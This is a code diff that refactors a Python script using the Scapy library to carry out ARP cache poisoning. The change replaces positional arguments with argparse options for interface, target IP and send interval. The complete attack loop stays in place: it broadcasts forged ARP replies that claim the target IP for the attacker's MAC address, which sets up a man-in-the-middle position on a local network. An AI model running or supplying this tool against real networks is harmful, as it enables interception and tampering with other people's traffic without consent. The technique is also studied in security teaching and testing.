@@ -8,33 +8,31 @@
 from scapy.all import *
 from time import sleep
 from os import geteuid
-import sys
+from sys import argv, exit
+from argparse import ArgumentParser
 
-try:
-	interface = sys.argv[1]
-	targetIP = sys.argv[2]
-except:
-	print("Usage: " + sys.argv[0] + " <Interface> <Target's IP>")
-	sys.exit(1)
-
-def mitm(interface, targetIP, interval=10):
+def mitm(interface, target, interval=10):
 	"""ARP cache poisoning attack"""
 	
 	try:
 		myMAC = get_if_hwaddr(interface)
 		print("[*] Starting attack ...")
 		while 1:
-			sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=targetIP, hwsrc=myMAC))
+			sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=target, hwsrc=myMAC))
 			sleep(interval)
 	except IOError:
-		print("[!] Interface doesn't exist")
-		sys.exit(1)
+		exit("[!] Interface doesn't exist")
 	except KeyboardInterrupt:
 		pass
 		print("\n[*] Stopping attack")
 
 if not geteuid() == 0:
-	print("[!] You must be root")
-	sys.exit(1)
+	exit("[!] You must be root")
 
-mitm(interface, targetIP)
+ap = ArgumentParser(description="ARP cache poisoning implementation using Scapy")
+ap.add_argument("-i", "--interface", required = True, help = "network interface")
+ap.add_argument("-t", "--target", required = True, help = "target's IP")
+ap.add_argument("-I", "--interval", type=float, default=10, help = "seconds between two ARP frames (default: 10s)")
+args = vars(ap.parse_args())
+
+mitm(args["interface"], args["target"], args["interval"])
